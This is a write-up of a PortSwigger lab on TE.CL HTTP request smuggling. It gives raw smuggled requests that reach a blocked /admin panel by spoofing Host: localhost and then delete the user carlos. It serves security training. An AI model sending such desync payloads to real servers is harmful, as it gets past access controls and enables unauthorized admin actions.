# Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

**Official lab:** [https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)

## Lab idea

This lab examines the inverse TE.CL parsing disagreement and its effect on front-end access restrictions. It practices evaluating how different message-length interpretations across proxy and backend can expose restricted functionality.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Try to visit /admin and observe that the request is blocked.
2. In Burp Suite, go to the Repeater menu and ensure that the "Update Content-Length" option is unchecked.
3. Using Burp Repeater, issue the following request twice: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 60 POST /admin HTTP/1.1…
4. Observe that the merged request to /admin was rejected due to not using the header Host: localhost .
5. Issue the following request twice: POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 71…
6. Observe that you can now access the admin panel.
7. Using the previous response as a reference, change the smuggled request URL to delete carlos : POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-length: 4…

## Payloads / key values
- `/admin`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 60 POST /admin HTTP/1.1 Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0`
- `\r\n\r\n`
- `0`
- `Host: localhost`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-length: 4 Transfer-Encoding: chunked 71 POST /admin HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0`
- `carlos`
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-length: 4 Transfer-Encoding: chunked 87 GET /admin/delete?username=carlos HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded Content-Length: 15 x=1 0`

## Official source
- [PortSwigger Academy: Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability](https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-te-cl)
